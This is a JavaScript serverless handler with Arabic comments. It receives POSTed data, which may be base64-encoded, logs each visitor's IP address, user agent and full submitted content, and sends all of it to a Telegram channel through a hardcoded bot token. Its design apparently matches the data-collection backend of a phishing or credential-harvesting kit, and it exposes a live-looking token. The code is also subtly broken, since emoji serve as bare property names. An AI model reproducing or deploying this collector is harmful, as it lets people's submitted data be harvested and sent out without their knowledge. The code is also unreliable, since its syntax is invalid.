// ========================== الاستقبال + تليغرام ==========================
const BOT_TOKEN = '8488074169:AAFQyGtxJIlRr-k4jVc6ZpRs1mQVyexy8cY'; // ← توكنك
const CHAT_ID   = '-7932290530';                                   // ← ايدي القناة

const cache = new Map();
const MAX   = 500;

function uid(){ return Math.random().toString(36).slice(2)+Date.now().toString(36); }

async function tg(txt){
  const safe = txt.replace(/([_*\[\]()~`>#+=|{}.!-])/g,'\\$1');
  await fetch(
    `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
    {method:'POST',headers:{'Content-Type':'application/json'},
     body:JSON.stringify({chat_id:CHAT_ID,text:safe,parse_mode:'MarkdownV2'})}
  ).catch(()=>{});
}

export default async function handler(req,res){
  if(req.method!=='POST') return res.status(405).send('Method not allowed');

  let body = req.body;
  if(typeof body==='string' && body.length>20){
    try{ body=JSON.parse(atob(body)); }catch{ return res.status(400).send('Bad Base64');}
  }

  const rep={
    🆔:uid(),
    📅:new Date().toLocaleString('ar-EG',{timeZone:'Africa/Cairo'}),
    🌐:req.headers['x-forwarded-for']?.split(',')[0]||req.socket.remoteAddress,
    📱:req.headers['user-agent'],
    📊:body
  };

  cache.set(rep.🆔,rep); if(cache.size>MAX) cache.delete([...cache.keys()][0]);

  await tg(`
*زائر جديد تمت إضافته* 👤
\`\`\`
الوقت: ${rep.📅}
الآيبي: ${rep.🌐}
المتصفح: ${rep.📱}
البيانات الكاملة:
${JSON.stringify(rep.📊,null,2)}
\`\`\``);

  res.status(204).end();
}
